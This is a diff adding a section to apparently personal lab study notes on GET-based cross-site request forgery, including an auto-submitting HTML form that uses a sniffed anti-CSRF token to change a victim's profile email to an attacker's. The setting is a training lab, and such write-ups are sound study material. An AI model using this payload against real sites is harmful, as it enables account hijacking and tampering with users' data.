@@ -428,3 +428,50 @@ we can see that after visiting the site we can see the logic of changing the pro
 
 remember that this attack will also work with GET based requests 
 
+## Cross-Site Request Forgery (GET-Based)
+
+similar to how we can extract session cookies from apps that don't use SSL encryption, we can do the same with CSRF tokens included in unencrypted requests 
+
+on our new target after using the save functionality we will see a confirmation window: 
+
+![](Images/Pasted%20image%2020240305134747.png)
+
+if we capture this second save functionality we can see it is a GET request: 
+
+![](Images/Pasted%20image%2020240305134819.png)
+
+one of the parameters, `csrf` is the anti-csrf token   
+
+lets say we were on the local network and sniffed the above request from the victim  
+we can use this to deface the victim's profile through a csrf attack 
+
+we can create and host another malicious HTML file: 
+
+```html
+<html>
+  <body>
+    <form id="submitMe" action="http://csrf.htb.net/app/save/julie.rogers@example.com" method="GET">
+      <input type="hidden" name="email" value="attacker@htb.net" />
+      <input type="hidden" name="telephone" value="&#40;227&#41;&#45;750&#45;8112" />
+      <input type="hidden" name="country" value="CSRF_POC" />
+      <input type="hidden" name="action" value="save" />
+      <input type="hidden" name="csrf" value="30e7912d04c957022a6d3072be8ef67e52eda8f2" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      document.getElementById("submitMe").submit()
+    </script>
+  </body>
+</html>
+```
+
+we can use the sniffed anti-csrf token in the above hidden `csrf` input field value   
+
+now as the logged in victim we can simulate their behavior by visiting our malicious site while logged in `http://<VPN/TUN Adapter IP>:1337/notmalicious_get.html`: 
+
+![](Images/Pasted%20image%2020240305135634.png)
+
+again our code is executed and the victim's profile is successfully edited 
+
+remember that in this example even if there was SSL encryption we would still be able to perform this attack because the anti-csrf token is directly in the URL, so we would only need to be on the local network and sniff this request 
+
